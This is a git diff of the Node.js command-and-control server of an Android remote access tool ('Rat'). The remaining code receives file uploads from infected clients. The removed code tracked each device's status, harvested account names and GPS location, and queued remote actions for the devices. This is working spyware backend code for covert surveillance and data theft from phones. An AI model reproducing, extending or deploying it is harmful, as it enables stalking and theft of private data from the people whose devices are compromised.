@@ -1,7 +1,6 @@
 /*
- * Rat HTTP server
- *
- * TODO make an angular dashboard to control the connected devices
+ * Android Rat HTTP server
+ * For use with the Java Rat Server
  */
 
 var express = require('express');
@@ -72,9 +71,6 @@ var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"
 // Simple connection logger
 // app.use(morgan(':date[clf] :remote-addr :url'));
 
-// Host angular dashboard:
-// app.use(express.static('rat-admin'));
-
 /*
  * A client is uploading a file
  */
@@ -89,7 +85,9 @@ app.post('/postFile/:clientId', (req, res) => {
     });
 });
 
-// Tell the client if we want to accept this file
+/*
+ * Tell the client if we want to accept this file
+ */
 app.get('/acceptFile/:clientId', (req, res) => {
     var fileName = req.query.fileName;
     var fileSize = req.query.fileSize;
@@ -106,99 +104,16 @@ app.get('/acceptFile/:clientId', (req, res) => {
     });
 });
 
-// Receive status and respond with actions to take on the client
-app.get('/status/:clientId', (req, res) => {
-    var clientId          = req.params.clientId;
-    var isLocationStarted = req.query.isLocationStarted;
-    var isAudioStarted    = req.query.isAudioStarted;
-    var isWifiConnected   = req.query.isWifiConnected;
-
-    connectionManager.addUpdate(clientId, isLocationStarted, isAudioStarted, isWifiConnected);
-    res.send(connectionManager.getLastById(clientId).actions);
-});
-
-app.get('/updateAccountInfo/:clientId', (req, res) => {
-    var connection = connectionManager.getLastById(req.params.clientId);
-    for(var account in req.query){
-        connection.accounts.push(req.query[account]);
-    }
-    res.send();
-});
-
-app.get('/updateLocation/:clientId', (req, res) => {
-    var connection = connectionManager.getLastById(req.params.clientId);
-    connection.location.lat = req.query.lat;
-    connection.location.lng = req.query.lng;
-    connection.location.accuracy = req.query.accuracy;
-    connection.location.timestamp = req.query.timestamp;
-    connection.location.provider = req.query.provider;
-    res.send();
-});
-
-app.get('/connections', (req, res) => {
-    res.send(JSON.stringify(connectionManager.connections, null, 4));
-});
-
+/*
+ * A helper for the client to check if the server is online
+ */
 app.get('/serverStatus', (req, res) => {
     res.send("Online...");
 });
 
-function Connection(clientId, isLocationStarted, isAudioStarted, isWifiConnected) {
-    this.clientId          = clientId;
-    this.lastSeen          = new Date().getTime();
-    this.isAudioStarted    = isLocationStarted;
-    this.isLocationStarted = isAudioStarted;
-    this.isWifiConnected   = isWifiConnected;
-    // The client gets a response with actions to take each time it connects
-    this.actions           = {
-        // Set actions to take
-    };
-    this.location = {
-        lat: '',
-        lng: '',
-        accuracy: '',
-        timestamp: '',
-        provider: ''
-    };
-    this.accounts = [];
-    this.wifiConnections = {
-    };
-
-}
-
-var connectionManager = {
-    connections: [],
-    addUpdate: function(clientId, isLocationStarted, isAudioStarted, isWifiConnected) {
-        // Check if connection exists
-        if (this.getLastById(clientId) === undefined) {
-            this.connections.push(new Connection(clientId, isLocationStarted, isAudioStarted, isWifiConnected));
-        } else {
-            this.getLastById(clientId).lastSeen = new Date().getTime();
-            this.getLastById(clientId).isLocationStarted = isLocationStarted;
-            this.getLastById(clientId).isAudioStarted = isAudioStarted;
-            this.getLastById(clientId).isWifiConnected = isWifiConnected;
-        }
-    },
-    clean: function() {
-        var timeout = 60000;
-        for (var i = 1; i < connectionManager.connections.length; i++) {
-            var count = 0;
-            if (connectionManager.connections[i].lastSeen < (new Date().getTime() - timeout)) {
-                var index = connectionManager.connections.indexOf(connectionManager.connections[i]);
-                connectionManager.connections.splice(index, 1);
-                count++;
-            }
-        }
-    },
-    getLastById: function(clientId) {
-        for (var i = this.connections.length - 1; i >= 0; i--) {
-            if (this.connections[i].clientId === clientId) {
-                return this.connections[i];
-            }
-        }
-    }
-};
-
+/*
+ * A helper function to check if a file exists
+ */
 function fileExists(dir, fileName, callback) {
     fs.stat(path.join(dir, fileName), (err, stats) => {
         if (err === null) {
@@ -211,9 +126,6 @@ function fileExists(dir, fileName, callback) {
         }
     });
 }
-
-// Clean dead connections
-setInterval(connectionManager.clean, 60000);
 
 // start the server
 var server = app.listen(PORT_NUMBER, function() {
